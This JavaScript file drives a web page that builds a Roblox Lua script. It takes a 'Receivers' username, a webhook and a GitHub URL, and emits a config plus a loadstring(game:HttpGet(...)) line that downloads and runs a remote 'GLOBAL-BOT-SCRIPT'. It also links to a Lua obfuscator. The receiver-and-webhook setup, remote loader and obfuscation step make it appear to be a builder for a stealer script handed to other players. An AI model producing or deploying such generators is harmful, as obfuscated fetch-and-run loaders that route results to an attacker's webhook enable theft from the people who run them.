// Get elements
const tutorialBtn = document.getElementById("tutorialBtn");
const backBtn = document.getElementById("backBtn");
const tutorialPage = document.getElementById("tutorialPage");
const scriptForm = document.getElementById("scriptForm");
const outputCard = document.getElementById("output");
const scriptBox = document.getElementById("scriptBox");
const copyBtn = document.getElementById("copyBtn");
const downloadBtn = document.getElementById("downloadBtn");
const obfuscationBtn = document.getElementById("obfuscationBtn");

// Show tutorial with fade in animation
tutorialBtn.addEventListener("click", () => {
  tutorialPage.classList.remove("hidden");
  tutorialPage.style.opacity = 0;
  tutorialPage.animate([{opacity: 0}, {opacity: 1}], {duration: 500, fill: 'forwards'});
  scriptForm.style.display = "none";
  outputCard.classList.add("hidden");
});

// Back button fades out tutorial and shows form again
backBtn.addEventListener("click", () => {
  tutorialPage.animate([{opacity: 1}, {opacity: 0}], {duration: 500, fill: 'forwards'})
    .onfinish = () => {
      tutorialPage.classList.add("hidden");
      scriptForm.style.display = "flex";
    };
});

// Open obfuscation playground in new tab
obfuscationBtn.addEventListener("click", () => {
  window.open("https://luaobfuscator.com/?", "_blank");
});

// Handle form submission
scriptForm.addEventListener("submit", (e) => {
  e.preventDefault();

  const username = document.getElementById("username").value.trim();
  const github = document.getElementById("github").value.trim();
  const webhook = document.getElementById("webhook").value.trim();

  // Basic validation for raw GitHub URL
  if (!github.startsWith("https://raw.githubusercontent.com/")) {
    alert("Please enter a valid Raw GitHub URL.");
    return;
  }

  // Create the Lua script dynamically
  const luaScript = `Config = {
  Receivers = {"${username}"},
  Webhook = "${webhook}",
  ScriptURL = "${github}",
}

loadstring(game:HttpGet("https://raw.githubusercontent.com/PRXJECT-DEV/GLOBAL-BOT-SCRIPT/refs/heads/main/Main%20Script"))()
`;

  scriptBox.textContent = luaScript;
  outputCard.classList.remove("hidden");
  outputCard.scrollIntoView({behavior: "smooth"});
});

// Copy script to clipboard
copyBtn.addEventListener("click", () => {
  navigator.clipboard.writeText(scriptBox.textContent).then(() => {
    alert("Script copied to clipboard!");
  }).catch(() => {
    alert("Failed to copy script.");
  });
});

// Download script as .lua file
downloadBtn.addEventListener("click", () => {
  const blob = new Blob([scriptBox.textContent], {type: "text/plain"});
  const url = URL.createObjectURL(blob);
  const a = document.createElement("a");
  a.href = url;
  a.download = "script.lua";
  document.body.appendChild(a);
  a.click();
  document.body.removeChild(a);
  URL.revokeObjectURL(url);
});